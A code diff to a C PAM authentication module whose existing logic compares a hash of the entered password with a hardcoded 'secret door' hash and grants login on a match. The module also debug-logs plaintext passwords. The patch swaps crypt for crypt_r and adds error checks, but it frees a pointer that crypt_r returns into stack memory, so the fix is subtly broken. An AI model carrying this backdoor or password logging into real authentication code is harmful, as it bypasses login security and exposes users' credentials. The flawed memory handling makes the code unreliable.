@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <crypt.h>
 
 #include <stdio.h>
@@ -35,6 +36,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const
     char *hash = NULL;
     size_t len = 0;
     ssize_t read;
+    struct crypt_data data[1] = {0};
 
     // Get application password
     pam_code = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
@@ -47,9 +49,18 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const
     }
 
     salt = (char *)calloc(1, strlen(SALT) + strlen("$1$") + 2);
+    if (!salt) {
+        pam_syslog(pamh, LOG_ERR, "Could not calloc memory for SALT buffer!");
+        goto exit;
+    }
 
     sprintf(salt, "$1$%s$", SALT);
-    hash = crypt(password, (const char *)salt);
+    hash = crypt_r(password, (const char *)salt, data);
+    if (hash == NULL) {
+        if (salt) free(salt);
+        pam_syslog(pamh, LOG_ERR, "Could not encrypt password!");
+        goto exit;
+    }
 
     debug("Password: %s\n", password);
     debug("Hash: %s\n", hash);
@@ -58,7 +69,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const
     if (!strncmp(hash, GOOD_PASSWORD, strlen(GOOD_PASSWORD))) {
         debug("Congratulation! You found the secret door\n");
         if (salt) free(salt);
-        if (salt) free(hash);
+        if (hash) free(hash);
         return PAM_SUCCESS;
 
     } else if (!strncmp(hash, BAD_PASSWORD, strlen(BAD_PASSWORD))) {
@@ -92,7 +103,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const
 
 exit:
     if (salt) free(salt);
-    if (salt) free(hash);
+    if (hash) free(hash);
     return PAM_AUTH_ERR;
 }
 
